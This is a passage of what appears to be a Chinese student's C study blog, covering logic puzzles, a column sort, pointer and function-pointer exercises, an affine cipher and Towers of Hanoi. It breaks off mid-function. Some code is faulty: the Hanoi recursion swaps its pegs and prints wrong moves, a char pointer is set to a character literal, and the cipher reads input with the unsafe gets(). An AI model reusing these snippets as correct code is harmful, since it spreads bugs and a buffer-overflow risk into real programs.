title="凶杀案"></a>凶杀案</h3><p>A：不是我</p><p>B：是C </p><p>C：是D </p><p>D：C在胡说 </p><p>三个真话一个假话</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//假设法</span></span><br><span class="line">    <span class="comment">//1为真0为佳，竖着一组</span></span><br><span class="line">    <span class="comment">//A:0 1 1 1</span></span><br><span class="line">    <span class="comment">//B:0 0 1 0</span></span><br><span class="line">    <span class="comment">//C:0 0 0 1</span></span><br><span class="line">    <span class="comment">//D:1 1 1 0</span></span><br><span class="line">    <span class="type">int</span> killer = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (killer = <span class="string">&#x27;A&#x27;</span>; killer &lt;= <span class="string">&#x27;D&#x27;</span>; killer++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((killer !=<span class="string">&#x27;A&#x27;</span>) + (killer == <span class="string">&#x27;C&#x27;</span>) + (killer == <span class="string">&#x27;D&#x27;</span>) + (killer != <span class="string">&#x27;D&#x27;</span>) == <span class="number">3</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;凶手是%c&quot;</span>, killer);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/Y9X8EFRSamPydft.png" alt="凶手是谁.png"></p><h3 id="趣味问题"><a href="#趣味问题" class="headerlink" title="趣味问题"></a>趣味问题</h3><h4 id="燃香问题"><a href="#燃香问题" class="headerlink" title="燃香问题"></a>燃香问题</h4><p>有一根香材质不均匀，燃完一根需要1h，给你两根香，确认一个15min实践段。</p><p>将第一根香两端点燃，这样就确定了一个30min，同时将第一根香一段点燃<br>在第一根香燃烧完后，第二根香就剩30min了，这样再按照第一根香的方法就确定了15min</p><h3 id="拆名次"><a href="#拆名次" class="headerlink" title="拆名次"></a>拆名次</h3><p>A：B第二，我第三<br>B：我第二，E第四<br>C:我第一，D第二<br>D：C最后，我第三<br>E:我第四，A第一<br>每位选手都说对了一半</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> d = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (a = <span class="number">1</span>; a &lt;= <span class="number">5</span>; a++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (b = <span class="number">1</span>; b &lt;= <span class="number">5</span>; b++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (c = <span class="number">1</span>; c &lt;= <span class="number">5</span>; c++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (d = <span class="number">1</span>; d &lt;= <span class="number">5</span>; d++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (e = <span class="number">1</span>; e &lt;= <span class="number">5</span>; e++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (((b == <span class="number">2</span>) + (a == <span class="number">3</span>) == <span class="number">1</span>)</span><br><span class="line">                        &amp;&amp; ((b == <span class="number">2</span>) + (e == <span class="number">4</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((c == <span class="number">1</span>) + (d == <span class="number">2</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((c == <span class="number">5</span>) + (d == <span class="number">3</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((e == <span class="number">4</span>) + (a == <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">                        )</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (a * b * c * d * e == <span class="number">120</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;a=%d b=%d c=%d d=%d e=%d \n&quot;</span>, a, b, c, d, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/waoOR93i4FNjuSV.png" alt="排名.png"></p><h3 id="二维数组列排序"><a href="#二维数组列排序" class="headerlink" title="二维数组列排序"></a>二维数组列排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> i, j, k, b[<span class="number">20</span>][<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,  &amp;b[i][j]);</span><br><span class="line"><span class="type">int</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; m - j - <span class="number">1</span>; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[k][i] &lt; b[k + <span class="number">1</span>][i])&#123;</span><br><span class="line">temp = b[k][i];</span><br><span class="line">b[k][i] = b[k + <span class="number">1</span>][i];</span><br><span class="line">b[k + <span class="number">1</span>][i] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/4RasZXYOAuoQJh9.png" alt="1111.png"></p><h3 id="3-7-指针"><a href="#3-7-指针" class="headerlink" title="3_7-指针"></a>3_7-指针</h3><h4 id="一级指针传参"><a href="#一级指针传参" class="headerlink" title="一级指针传参"></a>一级指针传参</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span>* ptr, <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *(ptr + i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* p)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 一级指针传参</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line">    <span class="type">int</span>* p = arr;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//p是一级指针</span></span><br><span class="line">    print(p, sz);</span><br><span class="line">    <span class="type">char</span>* ch = <span class="string">&#x27;w&#x27;</span>; <span class="comment">// 数组名是首地址</span></span><br><span class="line">    <span class="type">char</span>* p1 = &amp;ch; <span class="comment">//对于其它类型的变量需要取地址</span></span><br><span class="line">    test(&amp;ch);      <span class="comment">//取地址完再存放到同类型的指针变量也行</span></span><br><span class="line">    test(p1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="二级指传参"><a href="#二级指传参" class="headerlink" title="二级指传参"></a>二级指传参</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span>** p2)</span></span><br><span class="line">&#123;</span><br><span class="line">    **p2 = <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span>* pa = &amp;a;<span class="comment">//pa一级指针</span></span><br><span class="line">    <span class="type">int</span>** ppa = &amp;pa;<span class="comment">//ppa是二级指针</span></span><br><span class="line">    <span class="comment">//把二级指针进行传参？</span></span><br><span class="line">    test(ppa);</span><br><span class="line">    test(&amp;pa);<span class="comment">//传一级指针变量的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span>* pa = &amp;a;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">    <span class="type">char</span>* pc = &amp;ch;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> (*parr)[<span class="number">10</span>] = &amp;arr;<span class="comment">//取出数组的地址</span></span><br><span class="line">    <span class="comment">//parr 是指向数组的指针 - 存放的是数组的地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//函数指针-存放函数地址的指针</span></span><br><span class="line">    <span class="comment">//&amp;函数名- 取到的是函数的地址</span></span><br><span class="line">    <span class="comment">//数组名 != &amp;数组名 函数名 == &amp;函数名</span></span><br><span class="line">    <span class="comment">//pf就是一个函数指针变量</span></span><br><span class="line">    <span class="type">int</span> (*pf)(<span class="type">int</span>, <span class="type">int</span>) = &amp;Add;<span class="comment">//</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;, &amp;Add);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;, Add);//结果一样</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*pt)(<span class="type">char</span>*) = &amp;test;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*pf)(<span class="type">int</span>, <span class="type">int</span>) = &amp;Add;<span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> ret = (*pf)(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//另外的写法</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int (*pf)(int, int) = Add;//</span></span><br><span class="line"><span class="comment">    //int ret = (*pf)(3, 5);</span></span><br><span class="line"><span class="comment">    int ret = pf(3, 5);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d\n&quot;, ret);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="阅读俩段代码"><a href="#阅读俩段代码" class="headerlink" title="阅读俩段代码"></a>阅读俩段代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码1</span></span><br><span class="line">(*(<span class="type">void</span> (*)())<span class="number">0</span>)();</span><br><span class="line"><span class="comment">//调用0地址的函数，该函数无参，发返回类型是void</span></span><br><span class="line"><span class="comment">//1.void (*)() 函数指针类型</span></span><br><span class="line"><span class="comment">//2. ((void (*)()0 对0进行强制类型转化，被解释为一个函数地址</span></span><br><span class="line"><span class="comment">//3.(*(void (*)())0)() 调用0地址处的函数</span></span><br><span class="line"><span class="comment">//代码2</span></span><br><span class="line"><span class="type">void</span> (*signal(<span class="type">int</span> , <span class="type">void</span>(*)(<span class="type">int</span>)))(<span class="type">int</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//1. signal(int, void(*)(int)) + void(*)(int)</span></span><br><span class="line"><span class="comment">//2.signal和()先结合，说明signal是函数名</span></span><br><span class="line"><span class="comment">//3.signal函数的第一个参数类型是int，第二个参数的类型是函数指针</span></span><br><span class="line"><span class="comment">//该函数指针指向一个参数为int返回类型是void的函数</span></span><br><span class="line"><span class="comment">//4.signal函数的返回类型也是一个函数指针该函数指针指向一个参数为int，返回类型是void的函数</span></span><br><span class="line"><span class="comment">//5.signal是一个函数的声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*<span class="type">pfun_t</span>)</span><span class="params">(<span class="type">int</span>)</span>;<span class="comment">//对void(*)(int)的函数指针型重命名为pfun_t</span></span><br><span class="line"><span class="comment">//typedef unsigned int uint;</span></span><br><span class="line"></span><br><span class="line"><span class="type">pfun_t</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span>, <span class="type">pfun_t</span>)</span>;</span><br></pre></td></tr></table></figure><h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Affine</span><span class="params">()</span> <span class="comment">/* 仿射密码 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> length, i = <span class="number">0</span>, ka = <span class="number">0</span>, kb = <span class="number">0</span>, tmp;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********仿射密码********\n请输入最初的明文:&quot;</span>);</span><br><span class="line">    gets(c);</span><br><span class="line">    length = <span class="built_in">strlen</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入秘钥（两数字）：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span> (gcd(ka,<span class="number">26</span>) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;秘钥输入错误，请重新输入：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">        getchar(); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="comment">//大写字母 </span></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt; <span class="number">96</span> &amp;&amp; c[i] &lt; <span class="number">123</span>)</span><br><span class="line">            c[i] = (ka * (c[i] - <span class="number">97</span>) + kb) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        <span class="comment">//小写字母 </span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c[i] &gt; <span class="number">64</span> &amp;&amp; c[i] &lt; <span class="number">91</span>)</span><br><span class="line">            c[i] = (ka * (c[i] - <span class="number">65</span>) + kb) % <span class="number">26</span> + <span class="number">65</span>;   </span><br><span class="line">     &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n密文为：\n%s\n&quot;</span>, c);</span><br><span class="line">    <span class="comment">//printf(&quot;********请安1~3选择：********\n&quot;);</span></span><br><span class="line">    <span class="comment">//printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="comment">/* 求最大公因数 */</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        k = a % b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = k;</span><br><span class="line">    &#125; <span class="keyword">while</span>(k != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">exAffine</span><span class="params">()</span> <span class="comment">/* 仿射加密 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> length, i = <span class="number">0</span>, ka = <span class="number">0</span>, kb = <span class="number">0</span>, tmp;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********仿射密码*******\n请输入最初的密文：&quot;</span>);</span><br><span class="line">    gets(c);</span><br><span class="line">    length = <span class="built_in">strlen</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入秘钥（两数字）：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span> (gcd(ka,<span class="number">26</span>) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;秘钥输入错误，请重新输入：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">        getchar(); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="comment">//大写字母 </span></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt; <span class="number">64</span> &amp;&amp; c[i] &lt; <span class="number">91</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp = Ni(ka, <span class="number">26</span>) * ((c[i] - <span class="number">65</span>) - kb);</span><br><span class="line">            <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>)</span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//小写字母 </span></span><br><span class="line">         <span class="keyword">if</span> (c[i] &gt; <span class="number">96</span> &amp;&amp; c[i] &lt; <span class="number">123</span>)</span><br><span class="line">         &#123;</span><br><span class="line">            tmp = Ni(ka, <span class="number">26</span>) * ((c[i] - <span class="number">97</span>) - kb);</span><br><span class="line">            <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>)</span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n明文为：\n %s \n&quot;</span>, c);</span><br><span class="line">    <span class="comment">//printf(&quot;********请安1~3选择：********\n&quot;);</span></span><br><span class="line">    <span class="comment">//printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);</span></span><br><span class="line">    </span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">Ni</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (a * (++i) % b != <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> i = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********请按1~3选择：********\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;</span>);</span><br><span class="line">    <span class="comment">//scanf(&quot;%c&quot;, &amp;i);</span></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    i = getch(); </span><br><span class="line">    <span class="keyword">while</span> (i != <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            Affine();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">            exAffine();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;********请按1~3选择：********\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;</span>);</span><br><span class="line">        i = getch();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 俩层 </span></span><br><span class="line"><span class="comment">/*  三层 </span></span><br><span class="line"><span class="comment">1: A-&gt;C</span></span><br><span class="line"><span class="comment">2: A-&gt;B A-&gt;C B-&gt;C</span></span><br><span class="line"><span class="comment">3: A-&gt;C A-&gt;B C-&gt;B A-&gt;C B-&gt;A B-&gt;C A-&gt;C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">move</span><span class="params">(<span class="type">char</span> pos1, <span class="type">char</span> pos2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;%c &quot;</span>, pos1, pos2);</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">Hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> pos1, <span class="type">char</span> pos2, <span class="type">char</span> pos3)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        move(pos1, pos3);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Hanoi(n - <span class="number">1</span>, pos1, pos2, pos3);</span><br><span class="line">        move(pos1, pos3);</span><br><span class="line">        Hanoi(n - <span class="number">1</span>, pos2, pos1, pos3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">N:代表盘子个数</span></span><br><span class="line"><span class="comment">pos1:起始位置 </span></span><br><span class="line"><span class="comment">pos2:中转位置</span></span><br><span class="line"><span class="comment">pos3:目的位置</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Hanoi(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    Hanoi(<span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    Hanoi(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/09/17KRvbOmujZaqi8.png" alt="image.png"></p><h3 id="3-10"><a href="#3-10" class="headerlink" title="3_10"></a>3_10</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> 